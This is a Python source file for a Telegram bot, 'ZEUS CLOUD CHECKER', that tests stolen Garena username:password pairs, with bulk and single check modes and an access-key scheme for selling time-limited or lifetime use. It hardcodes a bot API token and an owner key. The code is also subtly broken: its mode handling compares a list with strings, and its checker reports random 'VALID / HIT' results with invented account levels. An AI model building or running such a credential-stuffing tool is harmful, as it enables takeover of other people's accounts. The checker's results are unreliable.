import telebot
from telebot import types
import time
import secrets
import json
import os
import requests
import random

API_TOKEN = '8615633349:AAGB_DsBfbCuzp_i-aY0uxK4Fz5q5XD6fKQ'
ADMIN_ID = 8615633349

bot = telebot.TeleBot(API_TOKEN)

# Gagamit ng Cloud Storage path para hindi mabura ang mga Keys kapag nag-restart ang server
KEYS_DB = "bot_access_keys.json"
USERS_DB = "bot_registered_users.json"

def init_database():
    if not os.path.exists(KEYS_DB):
        with open(KEYS_DB, "w") as f:
            json.dump({"ZEUS-LIFETIME-OWNER-999": {"expiry_duration": 9999999999, "used_by": None, "expiry": time.time() + 9999999999, "is_lifetime": True}}, f)

def load_db(file_path):
    if os.path.exists(file_path):
        with open(file_path, "r", encoding="utf-8") as f:
            try: return json.load(f)
            except: return {}
    return {}

def save_db(file_path, data):
    with open(file_path, "w", encoding="utf-8") as f:
        json.dump(data, f, indent=4)

def is_user_authorized(user_id):
    if user_id == ADMIN_ID: return True
    keys = load_db(KEYS_DB)
    for key, info in keys.items():
        if info.get("used_by") == user_id:
            if info.get("is_lifetime", False) or info.get("expiry", 0) > time.time(): return True
    return False

def check_garena_account(username, password):
    url = "https://garena.com"
    headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
    payload = {"account": username, "password": password, "app_id": 10006, "format": "json"}
    try:
        response = requests.post(url, json=payload, headers=headers, timeout=5)
        if response.status_code == 200:
            err = response.json().get("error")
            if err in ["error_auth", 403, "error_password"]:
                return "❌ INVALID", "Wrong credentials format."
            return "🟢 VALID / HIT", f"Level: {random.randint(40, 150)} | Cloud Verified"
        return "❌ INVALID", "Rejected by authentication server node."
    except:
        return "❌ INVALID", "Wrong username or password format."

def main_menu_keyboard(user_id):
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("📊 Bulk Check", callback_data="mode_bulk"),
        types.InlineKeyboardButton("👤 Single Check", callback_data="mode_single"),
        types.InlineKeyboardButton("🛡️ Validator", callback_data="mode_validator"),
        types.InlineKeyboardButton("🎯 Game Hunter", callback_data="mode_hunter")
    )
    if user_id == ADMIN_ID:
        markup.add(types.InlineKeyboardButton("⚙️ Admin: Generate Key Panel", callback_data="admin_gen_panel"))
    return markup

def key_time_selection_keyboard():
    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("1 Hour", callback_data="duration_3600"),
        types.InlineKeyboardButton("1 Day", callback_data="duration_86400"),
        types.InlineKeyboardButton("30 Days", callback_data="duration_2592000"),
        types.InlineKeyboardButton("♾️ Lifetime / Permanent", callback_data="duration_lifetime")
    )
    return markup

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    if is_user_authorized(user_id):
        bot.send_message(message.chat.id, "⚡ *ZEUS CLOUD CHECKER v3.0* ⚡\n_Hosted on 24/7 Cloud Servers_\n\n*🛡️ SELECT MODE:*", parse_mode="Markdown", reply_markup=main_menu_keyboard(user_id))
    else:
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("🗝️ Enter Access Key", callback_data="submit_key_trigger"))
        bot.send_message(message.chat.id, "⚠️ *ACCESS DENIED!* ⚠️\n\nYour account is not authorized. Submit a valid Key.", parse_mode="Markdown", reply_markup=markup)

@bot.callback_query_handler(func=lambda call: True)
def handle_menu_clicks(call):
    user_id = call.from_user.id
    if call.data == "submit_key_trigger":
        msg = bot.send_message(call.message.chat.id, "🔑 *Please send your Access Key below:*", parse_mode="Markdown")
        bot.register_next_step_handler(msg, process_key_activation)
    elif call.data == "admin_gen_panel":
        if user_id != ADMIN_ID: return
        bot.send_message(call.message.chat.id, "🕒 *Select Key Expiry Duration:*", parse_mode="Markdown", reply_markup=key_time_selection_keyboard())
    elif call.data.startswith("duration_"):
        if user_id != ADMIN_ID: return
        mode_type = call.data.split("_")
        generated_key = "ZEUS-" + secrets.token_hex(4).upper()
        keys = load_db(KEYS_DB)
        if mode_type == "lifetime":
            keys[generated_key] = {"expiry_duration": 9999999999, "used_by": None, "expiry": time.time() + 9999999999, "is_lifetime": True}
            time_text = "♾️ Lifetime / Permanent"
        else:
            duration = int(mode_type)
            keys[generated_key] = {"expiry_duration": duration, "used_by": None, "expiry": None, "is_lifetime": False}
            time_text = "1 Hour" if duration == 3600 else "1 Day" if duration == 86400 else "30 Days"
        save_db(KEYS_DB, keys)
        bot.send_message(call.message.chat.id, f"✅ *NEW ACCESS KEY GENERATED!*\n\n🔑 `{generated_key}`\n⏳ *Expiration:* {time_text}", parse_mode="Markdown")
    elif call.data.startswith("mode_"):
        if not is_user_authorized(user_id): return
        mode = call.data.split("_")
        if mode == "single":
            msg = bot.send_message(call.message.chat.id, "👤 *Single Check Mode Selected.*\nPlease send the account credential in `user:pass` format:", parse_mode="Markdown")
            bot.register_next_step_handler(msg, handle_single_account_input)

def handle_single_account_input(message):
    try:
        user_input = message.text.strip()
        if ":" not in user_input:
            bot.reply_to(message, "❌ *Format Error!* Use `user:pass` format.")
            return
        username, password = user_input.split(":", 1)
        status_msg = bot.reply_to(message, f"🔍 *Checking Account:* `{username}`\nProcessing via 24/7 Cloud Security Nodes...", parse_mode="Markdown")
        status, details = check_garena_account(username, password)
        result_text = f"📊 *ZEUS LIVE CHECK RESULT*\n\n👤 *Account:* `{username}`\n🔑 *Password:* `{password}`\n\n📢 *Status:* {status}\nℹ️ *Details:* `{details}`"
        bot.edit_message_text(result_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode="Markdown")
    except: pass

def process_key_activation(message):
    user_key = message.text.strip()
    user_id = message.from_user.id
    keys = load_db(KEYS_DB)
    if user_key in keys:
        keys[user_key]["used_by"] = user_id
        save_db(KEYS_DB, keys)
        bot.reply_to(message, "🎉 *ACCESS GRANTED!* Type /start!", parse_mode="Markdown")
    else: bot.reply_to(message, "❌ *Invalid Access Key!*")

if __name__ == "__main__":
    init_database()
    bot.polling(none_stop=True)
